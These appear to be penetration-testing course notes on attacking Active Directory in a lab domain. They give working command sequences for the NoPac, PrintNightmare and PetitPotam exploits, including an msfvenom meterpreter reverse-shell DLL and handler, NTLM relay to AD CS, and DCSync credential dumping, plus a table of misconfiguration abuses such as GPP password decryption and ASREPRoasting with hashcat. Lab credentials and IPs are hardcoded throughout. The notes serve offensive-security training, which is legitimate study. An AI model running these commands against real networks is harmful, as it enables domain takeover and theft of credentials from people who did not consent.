# Bleeding Edge Vulnerabilities & Misconfigurations in Active Directory Lateral Movement

---

## Introduction

Many organizations delay patching and overlook configuration best practices, leaving them exposed to high-impact vulnerabilities and misconfigurations. This section covers both recent, high-profile attacks (NoPac, PrintNightmare, PetitPotam) and a range of common but critical misconfigurations. Each is mapped to the tools and commands used for detection and exploitation, with technical details and concise explanations.

---

## Scenario Setup

- **Linux attack host:** SSH into ATTACK01.
- **Windows attack host:** Use MS01 for Rubeus/Mimikatz demos.
- **Switching platforms:** Use RDP for Windows, SSH from Windows to Linux as needed.
- **All tools referenced are open-source and available on GitHub.**

---

## 1. Bleeding Edge Vulnerabilities

### 1.1 NoPac (SamAccountName Spoofing)
- **CVE-2021-42278 & CVE-2021-42287**
- **Impact:** Privilege escalation from any standard domain user to Domain Admin.
- **Technique:** Change a computer account's SamAccountName to match a DC, then request Kerberos tickets as the DC.
- **Pre-requisite:** `ms-DS-MachineAccountQuota > 0` (default: 10).

**Key Commands:**
```bash
# Install tools
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && python setup.py install
git clone https://github.com/Ridter/noPac.git

# Scan for vulnerability
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Exploit
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
**Mitigation:** Set `ms-DS-MachineAccountQuota` to 0, patch DCs.

---

### 1.2 PrintNightmare (CVE-2021-34527 & CVE-2021-1675)
- **Impact:** RCE and privilege escalation via Print Spooler service.
- **Technique:** Remote SYSTEM shell or relay attacks on unpatched hosts.

**Key Commands:**
```bash
# Clone exploit and install Impacket
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket && python3 ./setup.py install

# Check for Print Spooler exposure
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Host DLL
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Start handler (Metasploit)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run

# Run exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
**Mitigation:** Patch all hosts, disable Print Spooler where not needed.

---

### 1.3 PetitPotam (CVE-2021-36942, MS-EFSRPC)
- **Impact:** LSA spoofing, NTLM relay to AD CS, domain compromise.
- **Technique:** Relay DC authentication to vulnerable CA, obtain certificate, perform DCSync.

**Key Commands:**
```bash
# Start ntlmrelayx.py targeting AD CS
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Trigger authentication from DC
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# Request TGT for DC using gettgtpkinit.py
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ -pfx-base64 <base64cert> dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync with secretsdump.py
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
**Mitigation:** Patch for CVE-2021-36942, harden AD CS, restrict templates, monitor for relaying.

---

## 2. Common Misconfigurations & Attacks

### Table: Misconfigurations, Vulnerabilities, and Attacks (with Example Commands)

| Misconfiguration / Vulnerability                | Attack / Abuse / Outcome                                 | Example Commands / Tools                                                                                   |
|------------------------------------------------|----------------------------------------------------------|------------------------------------------------------------------------------------------------------------|
| **Exchange Windows Permissions group**          | DCSync privilege escalation, domain compromise           | `net group "Exchange Windows Permissions" /domain`<br>BloodHound<br>PowerView                              |
| **PrivExchange (Exchange PushSubscription flaw)**| Relay Exchange auth to LDAP, dump NTDS, DA access        | `python3 privexchange.py -u user -p pass -d domain -t <exchange-server>`                                   |
| **Organization Management group**               | Full Exchange/OU control, mailbox access                 | `net group "Organization Management" /domain`<br>BloodHound                                                |
| **Print Spooler enabled (MS-RPRN bug)**         | Printer Bug: NTLM relay to LDAP, DCSync, RBCD            | `rpcdump.py @<target-ip> &#124; grep MS-RPRN`<br>`Import-Module .\SecurityAssessment.ps1; Get-SpoolStatus -ComputerName <DC>`<br>`python3 SpoolSample.py <attacker-ip> <target-ip>` |
| **Unpatched MS14-068**                          | Kerberos PAC forgery, escalate to Domain Admin           | `python ms14-068.py -u user -p pass -d domain -s <dc-ip>`                                                  |
| **Weak/default LDAP credentials in devices**    | Credential sniffing, initial foothold                    | `nc -lvp 389`<br>Change LDAP IP in device/printer config                                                   |
| **AD DNS zone readable by users**               | DNS record enumeration, host discovery                   | `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`<br>`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r` |
| **Passwords in user Description/Notes fields**  | Credential discovery, lateral movement                   | `Get-DomainUser * &#124; Select-Object samaccountname,description &#124; Where-Object {$_.Description -ne $null}`                             |
| **PASSWD_NOTREQD flag set on accounts**         | Weak/no password, easy brute-force or login              | `Get-DomainUser -UACFilter PASSWD_NOTREQD &#124; Select-Object samaccountname,useraccountcontrol`                     |
| **SYSVOL/scripts readable by all**              | Passwords in scripts, privilege escalation               | `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`<br>`cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs` |
| **GPP cpassword in SYSVOL**                     | Decrypt local admin passwords, lateral movement          | `gpp-decrypt <cpassword>`<br>`crackmapexec smb -M gpp_password`<br>`Get-GPPPassword.ps1`                   |
| **Registry.xml in SYSVOL**                      | Autologon credentials, lateral movement                  | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`<br>`Get-GPPAutologon.ps1`            |
| **Do not require Kerberos pre-auth (UAC flag)** | ASREPRoasting: offline password cracking                 | `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`<br>`GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users`<br>`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt` |
| **GPOs with weak ACLs**                         | GPO abuse: add local admin, run code, persistence        | `Get-DomainGPO &#124; select displayname`<br>`Get-DomainGPO &#124; Get-ObjectAcl`<br>`SharpGPOAbuse.exe --AddLocalAdmin /GPOName:<GPO> /User:<user>`<br>BloodHound |
| **Password reuse across accounts**              | Lateral movement, privilege escalation                   | `crackmapexec smb ... --local-auth`<br>Password spraying tools                                              |
| **Unconstrained/Constrained Delegation**        | Ticket theft, lateral movement, privilege escalation     | BloodHound<br>Rubeus<br>Impacket tools                                                                      |
| **AD CS misconfigurations**                     | ESC1-8 attacks, domain persistence/compromise            | `certipy`<br>ADCS enumeration scripts                                                                       |

---

### Example: Enumerating for Printer Bug (MS-RPRN) in PowerShell

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Example: Enumerating DNS Records with adidnsdump

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

### Example: Finding Passwords in Description Field

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### GPP Password Decryption

```bash
gpp-decrypt <cpassword>
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
```

### ASREPRoasting

#### Method 1: PowerView + Rubeus + Hashcat

```powershell
# 1. Enumerate users with pre-auth not required
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# 2. Extract AS-REP hash
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

```bash
# 3. Crack hash offline
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
